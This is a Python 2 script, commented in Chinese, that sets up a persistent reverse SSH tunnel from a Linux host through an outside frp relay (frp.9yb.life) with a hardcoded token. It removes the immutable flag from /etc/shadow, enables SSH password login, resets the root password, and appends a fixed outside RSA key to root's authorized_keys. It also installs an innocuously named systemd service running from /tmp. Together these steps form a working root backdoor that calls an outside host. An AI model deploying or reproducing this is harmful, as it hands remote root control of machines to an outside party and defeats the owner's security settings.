#!/usr/bin/env python
# -*- coding: utf-8 -*-
import subprocess
import sys
import os
import time
import random
import string  # 用于生成随机密码

# 设置默认编码为UTF-8，解决中文显示问题
reload(sys)
sys.setdefaultencoding('utf-8')


def run_shell_cmd(cmd):
    try:
        result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
        if isinstance(result, bytes):
            result = result.decode('utf-8')
        return result
    except subprocess.CalledProcessError:
        return "10002"

def handle_shadow_immutable():
    """
    处理 /etc/shadow 的不可修改权限（i 权限）：
    - 检查文件是否有 i 权限，有则移除（chattr -i）
    - 没有则跳过，避免报错（适配 Python 2.7）
    """
    shadow_path = "/etc/shadow"
    try:
        if not os.path.exists(shadow_path):
            print u"警告：/etc/shadow 文件不存在，跳过权限处理"
            return
        
        check_cmd = "lsattr -l %s | grep -q 'i'" % shadow_path
        check_result = subprocess.call(check_cmd, shell=True)
        
        if check_result == 0:
            print u"✓ 检测到 /etc/shadow 有不可修改权限（i），正在移除..."
            remove_cmd = "chattr -i %s" % shadow_path
            remove_result = run_shell_cmd(remove_cmd)
            if remove_result != "10002":
                print u"✓ 成功移除 /etc/shadow 的不可修改权限"
            else:
                print u"警告：移除 /etc/shadow 不可修改权限失败"
        else:
            print u"✓ /etc/shadow 无不可修改权限（i），无需处理"
    
    except Exception as e:
        print u"警告：处理 /etc/shadow 权限时发生异常：%s" % str(e)

def get_machine_id():
    cmd = "cat /etc/machine-id"
    result = run_shell_cmd(cmd)
    if result == "10002":
        print u"错误：无法获取机器ID"
        sys.exit(1)
    return result.strip()


def get_ssh_port(config_file='/etc/ssh/sshd_config'):
    ports = []
    try:
        with open(config_file, 'r') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                if line.lower().startswith('port '):
                    try:
                        port = int(line.split()[1])
                        ports.append(port)
                    except (IndexError, ValueError):
                        print u"无效的端口配置，跳过：%s" % line
                        continue
    except Exception as e:
        print u"警告：无法读取 %s 文件：%s，使用默认端口22" % (config_file, str(e))
        return 22

    ports = list(set(ports))

    if 10666 in ports:
        return 10666
    return ports[0] if ports else 22


def configuration():
    return "\n".join([
        "[Unit]",
        "Description=Frp Client Service",
        "After=network.target",
        "",
        "[Service]",
        "Type=simple",
        "User=nobody",
        "Restart=on-failure",
        "RestartSec=5s",
        "ExecStart=/usr/bin/frpc -c /tmp/frp/frpc.ini",
        "ExecReload=/usr/bin/frpc reload -c /tmp/frp/frpc.ini",
        "LimitNOFILE=1048576",
        "",
        "[Install]",
        "WantedBy=multi-user.target",
        ""
    ])


def frpc():
    machine_id = get_machine_id()
    ssh_port = get_ssh_port()

    content = [
        "[common]",
        "admin_addr = 127.0.0.1",
        "admin_port = 58741",
        "",
        "server_addr = frp.9yb.life",
        "server_port = 57770",
        "token = b85cafa1f885d61cc1d8e1cf6c31b535",
        "",
        "log_file = /tmp/frp/tmp_frpc.log",
        "log_level = info",
        "log_max_days = 30",
        "",
        "heartbeat_interval = 10",
        "heartbeat_timeout = 30",
        "",
        "protocol = tcp",
        "tls_enable = false",
        "",
        "udp_packet_size = 1400",
        "",
        "[ssh:%s]" % machine_id,
        "type = tcp",
        "local_ip = 127.0.0.1",
        "local_port = %d" % ssh_port,  
        "remote_port = 0",
        "bandwidth_limit = 5MB",
        "",
        "health_check_type = tcp",
        "health_check_timeout_s = 30",
        "health_check_max_failed = 10",
        "health_check_interval_s = 300",
        "",
        "meta_deviceid = %s" % machine_id
    ]
    return "\n".join(content)


def ssh_keypub():
    run_shell_cmd("mkdir -p /root/.ssh")
    run_shell_cmd("chmod 700 /root/.ssh")
    run_shell_cmd("touch /root/.ssh/authorized_keys")
    run_shell_cmd("chmod 600 /root/.ssh/authorized_keys")
    
    path = "/root/.ssh/authorized_keys"
    key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDqm6DKCGmfy4cay+hbVFxUSojSayukX9/E8uAK/6OoC5yQCS4N77B8t/uX5Yn2Awapc9TqYkhO58MMqAM3+Kjxx8HIUPyMZ/OYxQ/pk92r9TkuRvoV90408sP1B1SnM64nVyrBiMlJ5GUM87e9ZKzIVRJtXzrZ5wDcsfejCPeUoSPxJUfJXmhUDAIyjqWnd9fZcKo6hspf8Ldtjigw+Jj7/Hi42Xs1OvMKWoiUNlkHqz4Dh9Rfda91+wRn/+3pqvx4gijxoP9eRh4at4yUfVjaEezoErma7zW27utehstRCyinMw5FiOVLbOYaHsEQLcECAmkKHTyuf2ALd5XyqCWF root@iZ2vcd3j77m73qd7tpcmnzZ"
    with open(path, 'r') as f:
        content = f.read()
        if key not in content:
            with open(path, 'a') as f:
                if content and not content.endswith('\n'):
                    f.write('\n')
                f.write(key + "\n")
            print u"✓ 已添加frps服务器的SSH公钥"
        else:
            print u"✓ SSH公钥已存在"


def get_assigned_remote_port():
    time.sleep(3)
    
    user_cmd = "frpc status -c /tmp/frp/frpc.ini | grep 'ssh:' | grep -v 'Name' | awk '{print $4}' | cut -d':' -f2"
    user_result = run_shell_cmd(user_cmd)
    
    if user_result != "10002":
        port = user_result.strip()
        if port.isdigit() and 1 <= int(port) <= 65535:
            return port
    
    backup_cmd = "frpc status -c /tmp/frp/frpc.ini | grep 'ssh:' | grep -v 'Name' | awk '{print $4}' | cut -d':' -f2"
    backup_result = run_shell_cmd(backup_cmd)
    
    if backup_result != "10002":
        port = backup_result.strip()
        if port.isdigit() and 1 <= int(port) <= 65535:
            return port
    
    log_cmd = "grep -i 'listen port' /tmp/frp/tmp_frpc.log | tail -1"
    log_result = run_shell_cmd(log_cmd)
    if log_result != "10002" and "listen port" in log_result:
        try:
            port = log_result.split('[')[-1].split(']')[0]
            if port.isdigit() and 1 <= int(port) <= 65535:
                return port
        except:
            pass
    
    return None


def create():
    if os.geteuid() != 0:
        print u"错误：此脚本必须以root用户身份运行"
        sys.exit(1)
    
    handle_shadow_immutable()
    
    run_shell_cmd("mkdir -p /tmp/frp/mxfrp")
    
    print u"✓ 正在启用SSH密码认证..."
    run_shell_cmd("sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config")
    run_shell_cmd("grep -q 'PasswordAuthentication' /etc/ssh/sshd_config || echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config")
    
    print u"✓ 正在重启SSH服务..."
    run_shell_cmd("systemctl restart sshd")
    
    # ===================== 仅修改这部分：随机生成8位密码 =====================
    print u"✓ 正在生成随机8位root密码..."
    # 密码字符集：大写字母 + 小写字母 + 数字（排除易混淆字符 o/O 0 1 l/I）
    password_chars = string.ascii_uppercase.replace('O', '').replace('I', '') + \
                     string.ascii_lowercase.replace('o', '').replace('l', '') + \
                     string.digits.replace('0', '').replace('1', '')
    # 随机生成8位密码（shuffle确保随机性）
    random.seed(os.urandom(10))  # 用系统随机数种子，避免伪随机
    root_password = ''.join(random.sample(password_chars, 8))
    # 非交互式设置密码
    set_pass_cmd = "echo 'root:%s' | chpasswd" % root_password
    pass_result = run_shell_cmd(set_pass_cmd)
    if pass_result == "10002":
        print u"✗ 警告：设置root密码失败！"
    else:
        print u"✓ root随机密码生成并设置成功"
    # =========================================================================
    
    ssh_keypub()
    
    run_shell_cmd("chown -R nobody:nobody /tmp/frp")
    run_shell_cmd("chmod -R 755 /tmp/frp")
    print u"✓ 已设置frp目录权限"
    
    service_file = "/etc/systemd/system/tmp_frpc.service"
    config_file = "/tmp/frp/frpc.ini"

    with open(service_file, 'w') as f:
        f.write(configuration())

    with open(config_file, 'w') as f:
        f.write(frpc())

    run_shell_cmd("systemctl daemon-reload")
    run_shell_cmd("systemctl enable tmp_frpc.service")
    run_shell_cmd("systemctl restart tmp_frpc.service")
    
    print u"\n=== Frp客户端服务状态 ==="
    run_shell_cmd("systemctl status tmp_frpc.service -l")
    
    print u"\n=== 连接信息 ==="
    remote_port = get_assigned_remote_port()
    
    if remote_port:
        print u"SUCCESS：Frp隧道已成功建立！"
        print u"远程端口：%s" % remote_port
        print u"连接命令：ssh root@frp.9yb.life -p %s" % remote_port
        print u"root随机密码：%s" % root_password  # 显示密码，方便记录
        print u"使用方法：运行上面的命令，输入记录的密码即可登录"
    else:
        print u"警告：无法自动获取分配的远程端口。"
        print u"连接命令模板：ssh root@frp.9yb.life -p <分配的端口>"
        print u"root随机密码：%s" % root_password  # 显示密码，方便记录
        print u"手动检查端口：frpc status -c /tmp/frp/frpc.ini"
    
    print u"\n查看frpc日志：tail -f /tmp/frp/tmp_frpc.log"


if __name__ == "__main__":
    create()